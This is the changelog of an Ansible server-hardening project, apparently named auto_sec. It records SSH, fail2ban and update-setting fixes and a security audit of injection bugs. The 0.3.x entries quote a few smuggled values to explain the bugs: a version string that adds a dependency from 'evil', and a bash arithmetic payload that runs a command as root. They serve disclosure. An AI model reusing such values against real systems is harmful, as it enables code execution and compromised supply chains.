# Changelog

All notable changes to auto_sec are documented here. Format based on
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versioning is
[SemVer](https://semver.org/).

While auto_sec is **pre-1.0**, minor versions (0.x) may include breaking
changes. Treat it as early-stage — see the
[Disclaimer](README.md#disclaimer) and [RETROSPECTIVE](docs/RETROSPECTIVE.md).

## [Unreleased]

<!-- v0.5.0 work: #2 #3 #7 -->
<!-- Everything from here to "end of v0.5.0 work" belongs to the fail2ban,
     update, hostname and timezone fixes. The SSH entries below it are the
     v0.4.0 work. If both ship in ONE release, also remove "#2", "#3" and
     "#7" from the SSH block's Known limitations ("Full site.yml runs ...
     not yet safe") and its Upgrading note "(A --tags firewall run also
     adds it, but it overwrites jail.local, #2.)", and change its note
     "`--check` of a full run fails ... needs ufw and fail2ban already
     installed" to ufw only. -->

**fail2ban, automatic updates, hostname and timezone (#2, #3, #7).** A
full run no longer replaces your fail2ban or update files, no longer
turns on automatic reboots, and leaves the hostname and timezone alone.
Read **Upgrading (fail2ban, updates, hostname, timezone)** before you run
it on a server that auto_sec 0.1–0.4 set up.

### Breaking (fail2ban, updates, hostname, timezone)

- **Role 03 no longer writes `/etc/fail2ban/jail.local` (#2).** It
  writes only `/etc/fail2ban/jail.d/00-autosec.conf`. fail2ban reads
  that file before `jail.local` and the other `jail.d` files, so your
  values win.
- auto_sec's fail2ban values are now the variable `fail2ban_defaults`,
  with the same values as before (`bantime` 1h, escalating with factor
  2, `findtime` 10m, `maxretry` 4). They are fail2ban `[DEFAULT]`
  values. `fail2ban_defaults: {}` sets none. `backend = systemd` is no
  longer written.
- **No nginx jails from role 03.** The old `nginx-http-auth` and
  `nginx-botsearch` jails read the journal and never matched anything.
  Role 05 (only when `app_type` is set) now adds working ones
  (`backend = auto`) in `/etc/fail2ban/jail.d/00-autosec-nginx.conf`,
  after it has installed nginx (`fail2ban_nginx_jails: false` turns
  them off). A host where nginx is yours gets none.
- **The `restart fail2ban` handler is removed.** fail2ban is reloaded
  only when its effective config changes, and a reload keeps the bans.
  Only the `sshd` jail is restarted, and only when its port or action
  changes. A fail2ban that was installed before the run keeps its
  state: auto_sec no longer restarts or enables it.
- **Role 01 writes at most
  `/etc/apt/apt.conf.d/51autosec-unattended-upgrades` (#3)**, and only
  for a setting you chose; with the defaults it writes no apt file. It
  no longer replaces `50unattended-upgrades` (except the one-time
  restore in **Upgrading**, on request) and no longer writes
  `20auto-upgrades`.
- **`unattended_upgrades_enabled: auto` (the default) writes no update
  switch.** It installs `unattended-upgrades` if it is missing, and the
  package's own setup turns the updates on. So
  `dpkg-reconfigure unattended-upgrades` and your own interval keep
  working. A package you removed (dpkg state `rc`) is not installed
  again. `true` writes `"1"` (daily) into auto_sec's file and keeps the
  updates on.
- **Automatic reboots are no longer turned on (#3).** New
  `unattended_automatic_reboot`: `keep` (default), `true` or `false`.
  `true` needs `unattended_reboot_time`, quoted, for example `"03:30"`.
- `Unattended-Upgrade::Remove-Unused-Dependencies "true"` is no longer
  set.
- **The hostname and the timezone are left alone by default (#7).**
  `server_hostname` and `timezone` default to `keep`. Before, the
  timezone was set to `"UTC"` and the hostname to the inventory name on
  every run.
- **No `apt-get dist-upgrade` on every run.** Role 01 only installs
  missing packages; the nightly automatic updates do the rest. For a
  full upgrade, pass `-e apt_full_upgrade=true` for one run (the wizard
  adds it to the first run of a brand-new server).
- **Role 01 installs only `curl` (and `unattended-upgrades`), without
  their recommended packages.** It no longer installs git, htop, ncdu,
  age, apt-listchanges, python3-pip (which pulled in a compiler) or jq:
  no role uses them (role 07 installs age itself). It stops, before it
  changes anything, if installing a missing package would upgrade or
  remove a package you have (that can restart services), unless
  `apt_full_upgrade` is set.

### Fixed (fail2ban, updates, hostname, timezone)

- **#2:** a full run replaced `jail.local`. Your other jails (for
  example `recidive` and `nginx-bad-request`) disappeared and released
  their bans, and your stricter values were loosened.
- **#2:** nginx jails were turned on, also on hosts without nginx.
- **#3:** automatic reboots at 04:00 were turned on, with no way out. A
  server with a pending reboot rebooted the first night.
- **#3:** the origin list had no `#clear`, so another file's origins
  were added to it.
- **#7:** the hostname and timezone were changed on every run. A
  timezone change moved every cron job.
- **Debian hosts got no automatic updates at all.** The origins that
  0.1–0.4 wrote matched no Debian archive, while the report said
  updates were on.
- On Ubuntu, 0.1–0.4's file dropped the release pocket (which security
  fixes need for new dependencies) and the ESM infra updates.
- Installing the base packages could upgrade installed libraries (for
  example `libc6` through python3-pip's recommended compiler) and
  restart services.
- A full `--check` on a new server no longer fails in the fail2ban part.
- The client report claimed "fully patched", automatic updates "enabled"
  with a 04:00 reboot window, and "fail2ban active with escalating ban
  times", whatever the server did. It now prints what the run read:
  automatic updates on or off (and whether their timer runs), automatic
  reboot off or its time, a pending reboot, waiting updates, the sshd
  jail's values and the file they come from. The backup time printed
  `015:15` for hour 15; it is now `15:15`, with the server's timezone.

### Added (fail2ban, updates, hostname, timezone)

- **Read-only checks before any change**, in `pre_tasks` and also in
  `--check`:
  - fail2ban: fail2ban's own config reader runs on a copy of
    `/etc/fail2ban`, with and without auto_sec's file. The run shows
    what would change, the values the `sshd` jail uses, and the file
    each value comes from.
  - updates: apt itself reads a copy of `/etc/apt/apt.conf.d` with
    auto_sec's file added. The run shows which update settings would
    change.
- **Refusals:** auto_sec's fail2ban values would change a jail of
  yours; your fail2ban config does not load; a `jail.local` written by
  0.1–0.4; migrating it would make a jail stop ignoring an address;
  fail2ban runs a different config than its files; a file read before
  auto_sec's sets the same value; a file with auto_sec's name that
  auto_sec did not write (fail2ban and apt); a `50unattended-upgrades`
  written by 0.1–0.4; a file of yours read after auto_sec's apt file
  would cancel a choice; apt cannot read its configuration; installing
  a missing package would upgrade or remove one you have; an unknown
  timezone; a hostname change while a mail server listens on port 25,
  465 or 587.
- **Warnings and notes:** your own `ignoreip` hides `office_static_ip`;
  the `sshd` jail bans on another port than `ssh_port`; restarting the
  `sshd` jail releases its bans because fail2ban's database is off; a
  reload also loads your other unloaded fail2ban edits; automatic
  reboots are on (with the file and line that turns them on); a reboot
  is pending; automatic updates are off on purpose; Docker packages may
  be updated; the update timer is off; the cron jobs and timers a
  timezone change moves.
- New variables: `fail2ban_hardening_enabled`, `fail2ban_defaults`,
  `fail2ban_migrate_jail_local`, `fail2ban_nginx_jails`,
  `server_hostname`, `unattended_upgrades_enabled`,
  `unattended_automatic_reboot`, `unattended_reboot_time`,
  `unattended_origins` (`security`: security archives only),
  `unattended_exclude_docker`, `unattended_upgrade_blacklist`,
  `apt_full_upgrade`, `apt_migrate_unattended_upgrades`.
- `--tags fail2ban` runs the fail2ban part of role 03 alone.
- The wizard asks about automatic reboots and their time, Docker
  updates (Docker apps), the hostname, the timezone, and whether the
  server is brand-new.
- CI: `fail2ban-semantics` (five fail2ban builds, plus a real fail2ban
  1.0.2 server), `base-semantics` (five unattended-upgrades builds),
  live tests on GitHub's Ubuntu 22.04 and 24.04 VMs (`fail2ban-live`,
  `base-live`), and checks that no role writes `jail.local` or restarts
  fail2ban, and that `group_vars/all.yml` and the role defaults hold
  the same values.

### Upgrading (fail2ban, updates, hostname, timezone)

- **fail2ban on a host that 0.1–0.4 set up:** the run refuses its
  `jail.local` and shows what migrating changes. Then run once with
  `-e fail2ban_migrate_jail_local=true`: the file moves to
  `/var/lib/auto-sec/fail2ban/`. To keep the file as your own instead,
  add a comment line to it.
- On Ubuntu 22.04 and Debian 12, 0.1–0.4's fail2ban read the journal
  for the `sshd` jail. To keep that, add `backend: systemd` to
  `fail2ban_defaults`.
- If your office IP is banned now: `fail2ban-client unban <ip>`.
- **Update settings on a host that 0.1–0.4 set up:** when
  `50unattended-upgrades` is exactly 0.1–0.4's file, the run refuses
  and shows what putting the distro's file back changes. Then run once
  with `-e apt_migrate_unattended_upgrades=true`: the run keeps a copy
  in `/var/lib/auto-sec/backup/` and puts the distro's file back.
  Automatic reboots stop (unless you choose them), and on Ubuntu the
  release pocket and ESM infra updates come back. To keep the old file
  as your own instead, add a comment line to it (its 04:00 reboots then
  stay on unless you set `unattended_automatic_reboot: false`; the run
  warns). To put the distro's file back by hand:
  `cp /usr/share/unattended-upgrades/50unattended-upgrades /etc/apt/apt.conf.d/50unattended-upgrades`.
- **On Debian**, the first night after that migration may install many
  waiting updates (point releases too) and restart services, because
  0.1–0.4's file installed none. Set `unattended_origins: security`
  first to allow security updates only.
- Role 01 no longer installs git, htop, ncdu, age, apt-listchanges,
  python3-pip or jq. Those that 0.1–0.4 installed stay installed.
- To keep 0.4's behaviour: `unattended_automatic_reboot: true`,
  `unattended_reboot_time: "04:00"`, `server_hostname: <the inventory
  name>`, `timezone: "UTC"`.

### Known limitations (fail2ban, updates, hostname, timezone)

- A full run no longer replaces your fail2ban or update files, and no
  longer changes reboots, the hostname or the timezone. It adds its own
  `jail.d/00-autosec.conf` (and `51autosec-unattended-upgrades` only
  for an update setting you chose); the read-only checks show which
  effective values they change before anything is written. It still
  turns ufw on if it is off (only SSH, 80 and 443 stay open), creates
  the `deploy` user with passwordless sudo, writes kernel settings into
  `/etc/sysctl.conf`, installs `curl` and `unattended-upgrades` when
  they are missing, adds the detection roles, and stops at the report
  when `client_name` or `client_domain` is missing. See the README's
  Known limitations.
- Before a fail2ban reload, auto_sec compares only the jail list and
  each jail's `maxretry`, `findtime`, `bantime` and `ignoreip` with the
  running server. A reload also loads any other edit of yours that is
  not loaded yet (the run says so).
- `--tags fail2ban` does not update role 05's nginx jails (a run with
  `app` does).
- A fail2ban jail you add later without its own values uses
  `fail2ban_defaults`. The run checks your jails only while it runs.
- Lab-tested only: fail2ban's reload and restart on 1.0.2 (not 0.11.2
  or 1.1.x), and the update settings on five unattended-upgrades
  builds. The new live tests have not run yet.
- A full `--check` on a new server still fails at role 03's ufw part,
  because ufw is not installed yet.

<!-- end of v0.5.0 work -->

**SSH lockout fixes.** This release changes how auto_sec handles SSH,
and it has breaking changes. Read **Upgrading** before you run it on a
server that already exists.

### Breaking

- **Role 02 no longer writes `/etc/ssh/sshd_config` (#1).** It writes
  only `/etc/ssh/sshd_config.d/00-autosec.conf` (mode 0600). The main
  file and the other drop-ins are left alone. `templates/sshd_config.j2`
  is removed.
- **You choose the login rules (#6).** `ssh_permit_root_login` (`keep`,
  `prohibit-password` or `"no"`) and `ssh_password_authentication`
  (`keep` or `"no"`) have **no default**. The run stops until both are
  set. `keep` leaves the server's current setting alone. auto_sec never
  writes `yes`.
- **Quote `"no"`.** Unquoted, YAML reads `no` as `false`, and the run
  stops with "quote it".
- **New `ssh_admin_user`** (default: `deploy_user`) and
  **`ssh_admin_public_keys`**. This is the account you and Ansible log
  in as. A stricter rule is applied only on a run where Ansible really
  is logged in as this account. Otherwise it waits, and the run says
  why.
- **`AllowUsers deploy` is gone.** By default there is no AllowUsers
  line. Set `ssh_allow_users` if you want one. It must contain
  `ssh_admin_user`.
- **`ssh_max_auth_tries` is removed.** The run stops if it is still set.
  Use `ssh_extra_settings: {MaxAuthTries: 3}` instead.
- **No more fixed extra settings.** These are no longer written by
  default: `MaxAuthTries 3`, `LoginGraceTime 20`, `MaxSessions 5`,
  `X11Forwarding no`, `AllowAgentForwarding no`, `AllowTcpForwarding no`,
  `ClientAliveInterval 300`, `ClientAliveCountMax 2`, `LogLevel VERBOSE`
  and `Subsystem sftp internal-sftp`. Set the ones you want in
  `ssh_extra_settings`. `Subsystem` is never written.
- **`ssh_port` no longer moves sshd (#5).** It must be the port sshd
  already listens on. To move the port, follow `docs/ssh-port.md`.
- **SSH keys are only added (#4).** They are never removed or rewritten.
  `exclusive: true` is gone. A missing key is appended as a new line;
  every other line of `authorized_keys` stays byte for byte. An
  `authorized_keys` (or `~/.ssh`) that is a symlink is left alone, with
  a warning.
- **The `restart sshd` handler is removed (#9).** SSH changes now load
  at once, under an undo timer.
- **Role 02 refuses** hosts that are not Debian-family, and OpenSSH
  older than 8.2. Set `ssh_hardening_enabled: false` to run the other
  roles there.
- **Local mode** (`ansible_connection: local`) only applies SSH settings
  that change nothing in the effective config. A real change stops the
  run before anything is written. Run it from your own computer instead.
  An SSH login from the server to itself (`ansible_host: 127.0.0.1`)
  counts as local mode too.
- **No `-e ansible_ssh_args` or `-e ansible_become`.** Extra vars would
  override the options of the login tests, so the run refuses them. Put
  extra ssh options in `ansible_ssh_common_args` instead.
- **Role 02 needs `ssh.service`.** Without `ssh.socket`, the sshd on
  `ssh_port` must be the main process of `ssh.service`; an sshd started
  another way is refused, because the reload would not reach it.
- **High mode keeps SSH visible.** Role 03 now adds the rate-limited SSH
  rule at both paranoia levels, and role 04 never deletes it. Hiding SSH
  behind fwknop returns in a later release. A high-mode host set up by
  0.1–0.3 has no SSH rule until role 03 runs or you add it: see
  **Upgrading**.
- `paranoia_level` must be `standard` or `high`.
- `office_static_ip` must not be one of the server's own addresses.
- At most `ssh_max_hosts_per_run` hosts (default 5) get an SSH change in
  one run. Use `-l` for more.

### Fixed

- **#1:** the main `sshd_config` was replaced by a file without
  `Include`. Provider settings and hand-made drop-ins silently stopped
  working.
- **#4:** every run deleted all other SSH keys of the deploy user.
- **#5:** on Ubuntu 24.04, changing `ssh_port` could leave sshd on the
  old port while the firewall opened only the new one. The next reboot
  or SSH update then switched ports. auto_sec now refuses a wrong
  `ssh_port`, and a hidden `ssh.socket` port switch, before it changes
  anything.
- **#6:** root login and passwords were always turned off, and the key
  was never tested. Now it is your choice per host. A stricter rule is
  applied only after a key login works on a brand-new connection.
- **#9:** new SSH settings were written early, but loaded only at the
  end of the run, or later by surprise (at a reboot or an update). Now
  they load at once, a fresh login is tested, and a failure undoes the
  change automatically.
- The wizard's first-run command used `-u root`, but the inventory's
  `ansible_user` wins over `-u`, so the first run could not connect. It
  now uses `-e ansible_user=root`, and explains the second run.
- In local mode, the wizard offered the server's own IP as the
  break-glass IP. It no longer does, and the run refuses it.
- A typo in `paranoia_level` silently skipped the SSH firewall rule.
- High mode enabled ufw with no SSH rule, and deleted the rule before
  checking fwknopd. Now the SSH rule exists at both levels, ufw is
  enabled only while it is inactive and only when that rule exists, and
  role 04 checks that fwknopd is active.
- The report claimed SSH settings that were not active. It now prints
  the effective `sshd -T` values, and says "SSH login NOT hardened" when
  that is true.
- The wizard said re-running is always safe, and suggested cron. Both
  are removed (see Known limitations).

### Added

- **Checks before any change.** They run in `pre_tasks`, before role 01.
  They only read, and they also run in `--check`. The run stops on: a
  wrong `ssh_port`; a hidden `ssh.socket` port switch; SSH files changed
  after sshd last loaded them (every file sshd reads, whichever
  `Include` pulls it in); an undo that is still pending; an active ufw
  with no rule that lets a new SSH connection reach `ssh_port`. Checks
  that only protect role 02's own change (the trial run, the host cap,
  local mode) are skipped when the tags leave role 02 out, for example
  `--tags firewall`.
- **A trial run on a copy** of the SSH config, with a before/after diff
  of `sshd -T` (also in `--check`). A login setting you did not choose
  may not change, unless you pass
  `-e ssh_accept_unrequested_changes=true` for one run.
- **Key tests on a brand-new connection**, before and after the change,
  the way Ansible logs in.
- **`auto-sec-ssh-guard`**, an automatic undo timer (`ssh_revert_seconds`,
  default 300), and a boot unit that puts the old files back if the
  server reboots inside the window.
- **fail2ban ignores your IP during the run**, so failed tests cannot
  get you banned. The exception is removed at the end. While it is in
  place, the IP is kept only in `/run/auto-sec/f2b-ignore` and, once
  the undo is armed, in the guard's undo state under
  `/var/lib/auto-sec/ssh-guard`; both copies go when the change is kept
  or undone. If a run is interrupted before it can remove the
  exception, the next run removes it first (see SECURITY.md).
- A WARNING, "SSH login NOT hardened", while root or password login is
  still on.
- New variables: `ssh_hardening_enabled`, `ssh_admin_user`,
  `ssh_admin_public_keys`, `ssh_allow_users`, `ssh_extra_settings`,
  `ssh_migrate_sshd_config`, `ssh_accept_unrequested_changes`,
  `ssh_revert_seconds`, `ssh_max_hosts_per_run`, and
  `fail2ban_ignore_ips` (written to `jail.local` `ignoreip`, together
  with `office_static_ip`).
- `docs/ssh-port.md`: how to move the SSH port by hand, safely.
- The wizard asks for the admin login account and the two login
  choices, and says what the login rules will be.
- CI: sshd semantics on five OpenSSH builds (Ubuntu 22.04, 24.04 and
  26.04; Debian 12 and 13), guard unit tests, and live role tests on
  GitHub's Ubuntu 22.04 and 24.04 VMs.

### Upgrading

- Set `ssh_permit_root_login` and `ssh_password_authentication`. To
  change nothing about logins, use `keep` for both.
- Set `ssh_admin_user` to the account Ansible logs in as, and
  `ansible_user` to the same name. If you log in as root, set both to
  `root`.
- Remove `ssh_max_auth_tries`. Use `ssh_extra_settings.MaxAuthTries` if
  you want it.
- **Hosts set up by 0.1–0.3** have a main `sshd_config` without
  `Include`. The run refuses it, and prints today's effective values.
  This block keeps what 0.3 did:

  ```yaml
  ssh_admin_user: deploy
  ssh_permit_root_login: "no"
  ssh_password_authentication: "no"
  ssh_allow_users: [deploy]
  ssh_extra_settings: {MaxAuthTries: 3, LoginGraceTime: 20, MaxSessions: 5,
    X11Forwarding: "no", AllowAgentForwarding: "no", AllowTcpForwarding: "no",
    ClientAliveInterval: 300, ClientAliveCountMax: 2, LogLevel: VERBOSE}
  ```

  If 0.3 moved the port to N, first create
  `/etc/ssh/sshd_config.d/10-port.conf` with the line `Port N`. Then run
  once:
  `ansible-playbook -i inventory site.yml -l <host> --tags ssh -e ssh_migrate_sshd_config=true`.
  The stock `sshd_config` comes back, under the trial run and the undo
  timer. Small expected differences remain: `AcceptEnv`, `PrintMotd` and
  the `Subsystem` path.
- **A 0.3 `sshd_config` that was written but never loaded** is refused.
  Do not load it unless `deploy` can log in. Copy the stock file over it
  by hand, check `sshd -T`, reload with a second session open, test a
  new login, then run again.
- Keys deleted by older versions are gone. Add the ones you need to
  `ssh_admin_public_keys`.
- Keep private keys in WSL `~/.ssh`, not under `/mnt/c`.
- **High-mode hosts set up by 0.1–0.3** have no ufw rule for SSH: 0.3's
  fwknop role deleted it, so only a knock opens the port, for
  `fwknop_open_seconds`. A `--tags ssh` run does not add the rule back,
  and its login tests open new connections, so the run refuses with
  "none of its rules lets a new connection ... reach ssh_port". Add the
  rule first, from a session you opened after a knock:
  `sudo ufw limit <ssh_port>/tcp`. (A `--tags firewall` run also adds
  it, but it overwrites `jail.local`, #2.) Then do the migration run
  above. From then on SSH stays visible and rate-limited.
- On existing production hosts, use `--tags ssh` for now (see below).

### Known limitations

- **Full `site.yml` runs on existing production hosts are not yet
  safe.** They still overwrite `jail.local` (#2), turn on automatic
  reboots (#3), and change the hostname and timezone (#7). Use
  `--tags ssh` until those are fixed. Do not run the playbook from cron.
- Local mode cannot tighten SSH logins. Run from your own computer.
- High mode does not hide SSH in 0.4.0.
- The key test covers only the controller's path: its key and its IP.
  VS Code and other clients can still break in stage 2. Test them
  yourself first.
- **Debian 12 and 13 are CI-tested only.** Their real OpenSSH packages
  are checked, unprivileged, for how they read the config. There has
  been no live run on Debian.
- **Verified only in a lab** (OpenSSH builds unpacked from the distro
  packages and run unprivileged in WSL, not on a real server):
  - a keep-everything file changes no `sshd -T` value, on five builds,
    with stock and cloud-image layouts;
  - stage 2 changes exactly `permitrootlogin` and
    `passwordauthentication`;
  - `sshd -T` works for an account that does not exist yet;
  - the undo timer's absolute deadline holds across a `daemon-reload`
    (tested with the user manager, not the system one);
  - open sessions survive a reload.
- **Not yet verified on a real server:** the boot-time undo after a
  reboot; migrating a real 0.1–0.3 host; the "files changed after the
  last load" check on a real
  `ssh.service` (Ubuntu 22.04's systemd 249 rejects
  `systemctl show --timestamp=unix`, so there the check falls back to
  parsing the plain timestamp, tested only with a stub); the fail2ban ignore; test retries
  together with ufw's `limit` rule; the fwknop role end to end; the
  ufw-rule and "sshd is ssh.service's main process" checks against real
  `ufw show added` and `ss -p` output (lab stubs only).
- `--check` of a **full** run fails on a fresh server at role 03, which
  needs ufw and fail2ban already installed (older than 0.4.0). Preview
  the SSH part with `--check --diff --tags ssh`.
- The checks read data from the server (`sshd`, `systemctl`, `ss`, the
  journal, `SSH_CONNECTION`). They guard against mistakes, not against
  a server that is already compromised.

## [0.3.2] - 2026-10-14

### Fixed

- **CI was red on the v0.3.1 tag.** The new port check in
  `scripts/configure.sh` used `A && B || C`, which ShellCheck reports
  (SC2015) at its default severity. The check itself was correct; it is
  now a plain `if`. No runtime behaviour changed. The 0.3.1 checks were
  run locally at `-S warning`, which hides that class of note.
- `CONTRIBUTING.md` now lists the same ShellCheck command CI runs
  (`scripts/` and `tests/`, default severity).

## [0.3.1] - 2026-10-14

**Security release — completes 0.3.0. Upgrade promptly.**

### Correction to the 0.3.0 notes

The 0.3.0 entry below originally said *"59 issues were found and fixed."*
**Both parts of that were wrong.** The audit produced **89** findings — the 59
was counted before the last of five audit areas (the scripts, role 10 and
role 11) had finished — and 0.3.0 did not fix all of them. Overstating a
security fix is itself the kind of false assurance `SECURITY.md` classes as a
bug, so this is called out rather than quietly edited. This release fixes the
remainder; the findings deliberately left unchanged are listed at the end with
reasons, so the claim is checkable.

### Fixed — data from outside your control

- **`scripts/cve-pr.sh` — OSV data reached a regex replacement and package
  managers.** A fixed-version string from `api.osv.dev` was used as an
  `re.sub` *replacement*, where backslash escapes are interpreted: a value like
  `1.0\n-e git+https://evil/pkg` would add an attacker's dependency to the pull
  request you then merge. The replacement is now a function, so the version is
  inserted literally, and every package name and version is validated (no
  whitespace, control characters, backslash, quotes or leading `-`) before it is
  written to the plan, passed to a package manager, or used in a regex.
- **CVE scanner (role 11)** now validates package names (from lockfiles) and
  fixed versions (from OSV) per ecosystem, drops anything malformed, and builds
  the displayed fix command with `shlex.quote` so a copy-pasted command can never
  do more than it says.
- **The wizard trusted `api.ipify.org`.** Its response was offered as the
  default break-glass IP unvalidated; it is now only used if it parses as an IP.

### Fixed — the setup wizard (`scripts/configure.sh`)

- **YAML injection into `host_vars` (critical).** Values were written as
  `echo "key: \"${VAR}\""`, so a typed `"` or `\` broke out of the string and
  could add arbitrary keys — including ones preflight never checks. All 25 write
  sites now emit single-quoted YAML scalars, inside which YAML interprets nothing
  but `''`.
- A value containing a newline (typically a `.pub` file holding several keys)
  now **aborts** the wizard. Previously the guard ran inside `$(...)`, where an
  `exit` only ends the subshell, so the wizard carried on and wrote an empty
  value.
- `app_port`, the server address, the chat id and the bot token are validated as
  they are typed.
- **The bot token is no longer on a `curl` command line**, where any local user
  can read it with `ps`. That matters because in local mode the wizard runs on
  the server itself. Calls now pass the URL to `curl -K -` on stdin.

### Fixed — secrets in logs

- A failed Telegram alert logged the exception text, which **contains the
  request URL, which contains the bot token** — into journald, and on first
  deploy into Ansible's output. Only the status code is logged now.
- `no_log: true` added to the `watcher.conf` and `cve-watch.conf` template tasks
  (both render the token); 0.3.0 had missed them.

### Fixed — other

- `tests/redteam.sh` read integers from config into `$(( ))`. Bash arithmetic
  evaluates array subscripts, so a value like `a[$(cmd)]` executes `cmd` as root.
  Values must now be plain integers.
- Preflight now also validates `inventory_hostname` (a path component in the
  report), `app_port` (nginx `proxy_pass`), `pg_version` (a path component),
  `client_name` (the client-facing report) and `cve_watch_min_severity`.
  `ssh_port` is coerced with `| int` in the fwknop role too.
- An unfilled template now fails with a clear **"still a CHANGE_ME
  placeholder"** message instead of a misleading "unsafe shape".
- B2 key validation was relaxed to a permissive charset. Backblaze does not
  publish the key format, and a validator that rejects a real key is a bug of its
  own; only characters that could inject into `rclone.conf` are excluded.

### Deliberately not changed

Ten findings involve input that only the operator controls, in operator-only
tooling, where the realistic attacker would have to already own the operator's
machine. They are accepted rather than fixed:

- `bootstrap.sh` — `SECURE_DEPLOY_REPO` env var and the clone directory.
- `release.sh`, `cve-pr.sh` — the repo slug derived from your own `git remote`.
- `cve-pr.sh` — the `--branch` argument (quoted), and advisory summaries
  rendered as markdown into a PR description you review before merging.
- `configure.sh` — `eval "$RUN_CMD"`, built only from the validated server name.
- Role 02 — `ssh_public_key_file`, a path looked up on your own control machine.
- `tests/redteam.sh` — `app_users`, quoted, read from a root-owned file.
- Role 04 — the network interface name from host facts, which the kernel
  limits to 15 non-whitespace characters.

Four more are mitigated by other fixes and were not changed directly: the
detector's peer address from `ss` (only reaches the now-validating
`block_ip`), the evidence-file tag (code constants, not input), the OSV response
body (parsed as JSON, values validated downstream), and a wizard log-leak report
that no longer reproduces.

## [0.3.0] - 2026-10-14

> **Correction:** this entry originally claimed "59 issues were found and
> fixed". The audit found 89, and not all were fixed here. See the next release
> above for the correction and the remainder.

**Security release — upgrade promptly.** A codebase-wide audit found a class of injection bugs
where a variable's *value* could stop being data and become part of a command,
a file path, or a config directive.

**Realistic impact today:** most of these variables are typed by the operator,
so exploiting them meant attacking your own infrastructure. The reason they are
being treated as security bugs is the boundary: the moment any value is derived
from a managed host — a hostname read from a vhost, a package name, a domain —
an attacker with limited access to that host could reach a root command. One
issue (the detector one, below) was reachable **without any operator mistake**.

### Fixed — code execution

- `node_version` was interpolated into `curl … | bash` as root. Replaced with a
  fetch-then-run via `get_url` + `command`, so no shell is involved.
- `db_name`, `app_dir`, `b2_bucket` and `age_public_key` were interpolated into
  `backup.sh`, which runs **as root from cron every night**. All values now go
  through `| quote` (a single-quoted shell literal). Double quotes are *not*
  sufficient — bash expands `$(…)` and backticks inside them.
- `telegram_bot_token` / `telegram_chat_id` were rendered into two root-run
  shell scripts (the 5-minute audit cron and the `Restart=always` canary unit).
  Credentials are now written to root-only files and read at runtime, so they
  never appear in shell source, in `ps`, or in a `--diff`.
- `restore-test/monthly-restore.yml` had unquoted values in shell tasks and runs
  on the **ops machine that holds every client's age private key**. Rewritten to
  use `command: argv:` throughout, with `| quote` where a shell is genuinely
  required.

### Fixed — backup integrity

- **`age -r "{{ age_public_key }}"` could be given a second recipient.** A
  crafted value rendered as two `-r` flags, so every backup would also be
  readable by an attacker — and a restore test would still pass, because the
  legitimate recipient was still present. The recipient is now written to a
  root-only file and consumed with `age -R`, which cannot be extended through a
  command line.
- The monthly restore test now **counts the recipient stanzas in the age header
  and fails if there is more than one**, which detects exactly the attack a
  successful decrypt cannot see.

### Fixed — privilege escalation and file writes

- `client_domain` reached `certbot` through `command:`, where argv splitting let
  a value inject `--deploy-hook` — persisted by certbot into the renewal config
  as root execution on every future renewal. Now passed via `argv:`.
- `client_domain` was used as a path component under `/etc/nginx/sites-*`,
  allowing traversal to arbitrary root-owned files. Now validated as a hostname.
- `app_dir` reached `pm2 startup --hp` through argv splitting, which could append
  a second `--user` and make the application's process manager run **as root**.
  Now passed via `argv:`.
- `db_name` was interpolated into MySQL's `priv` string DSL, where `/` and `:`
  could append grants (e.g. `*.*:ALL`). Now passed as a dict key.

### Fixed — config injection

A newline in a value could append directives to files that are newline-
delimited. Affected `sshd_config` (`ssh_port`, `ssh_max_auth_tries`,
`deploy_user` — where an injected `Match` block overrides hardening regardless
of order, and `sshd -t` still passes because the result is valid syntax), the
fail2ban jail, fwknop `access.conf`, the audit rules, and `watcher.conf`.
Numerics are now coerced with `| int` in the templates themselves, so a
tag-scoped run that skips the preflight is still safe.

### Fixed — detector hardening

- **`block_ip()` accepted an unvalidated address parsed from `auth.log`.** Log
  lines contain attacker-influencable text, so a crafted entry could make the
  detector ban an arbitrary address — including the operator's. The value must
  now parse as a routable IP; loopback, private, link-local and reserved
  addresses are refused.
- The ransomware canary had **no `sleep`** in its loop. With a missing or wrong
  `app_dir`, `inotifywait` exits instantly and the unit spins a full CPU core
  forever. It now backs off, excludes `node_modules`/`.next`, and tolerates a
  missing directory.

### Added

- **Preflight value validation** in `site.yml` — charset, range and CR/LF checks
  for every operator-supplied variable, enforced before any change. This is the
  single enforcement point; roles may assume a validated value and must still
  quote it.
- `no_log: true` on every task that handles a token, key or password. Previously
  **no task in the repo had it**, so `-vvv` or `--diff` printed secrets.
- `SECURITY.md` — disclosure process, and the trust boundary written down:
  *facts collected from a managed host must never be promoted into variables
  automatically.*
- CI now lints the **rendered** `.sh.j2` templates and fails the build if any
  interpolation in a shell template skips `| quote` or `| int`.
- Role 08 refuses to run if auditd is in immutable mode, and only watches the
  deploy user's `authorized_keys` if the path exists (previously a tag-scoped
  run could fail the whole ruleset load).

### Changed

- The audit rules file is now `90-autosec.rules` (was `hardening.rules`) so a
  site-local `99-*.rules` can still apply `-e 2` last. The old file is removed
  on upgrade to avoid a duplicate ruleset.
- Preflight validation **may reject configurations that previously ran** — this
  is why the minor version is bumped. If a run now fails preflight, the value it
  names was reaching a shell or a config file unescaped.

## [0.2.1] - 2026-08-15

### Fixed

- CI: the CVE scanner smoke test asserted the wrong package count. Its
  fixture contained one runtime dependency plus a dev-only one — which the
  scanner correctly excludes — so it reported 1 where the test demanded 2,
  turning the v0.2.0 build red. The scanner itself was never affected. The
  fixture now holds two runtime dependencies (one scoped, exercising
  `@scope/name` parsing) plus a dev-only one, so the assertion proves both
  inclusion and dev-exclusion.

## [0.2.0] - 2026-08-15

### Added

- **CVE watch (role 11)** — a daily scan that answers "is anything I run
  now known-vulnerable?". Reads the app's dependency lockfiles, queries
  [OSV.dev](https://osv.dev), and alerts with the **minimal safe upgrade**
  and a copy-pasteable fix command; also counts unapplied OS security
  updates. Supports npm, PyPI, Packagist and Go lockfiles, and *reports*
  unsupported lockfiles rather than silently skipping them. Findings are
  alerted once (state-deduplicated) and the full list is always written to
  `/var/log/sentinel/cve-report-*.txt`.
  - Adds **no third-party binary** to the server: the scanner is stdlib
    Python, so hardened hosts gain no new supply-chain surface. Outbound
    calls are HTTPS to `api.osv.dev` only, already allowed by
    `egress_lockdown`.
  - Runs under a hardened systemd timer (`ProtectSystem=strict`,
    `NoNewPrivileges`), daily with a randomized delay.
  - Defaults to `min_severity: high` to avoid first-run alert fatigue.
- **`scripts/cve-pr.sh` (Tier 2)** — turns findings into a pull request
  against your repository, which is where a dependency fix actually
  persists (patching the server is undone by the next deploy). Collapses
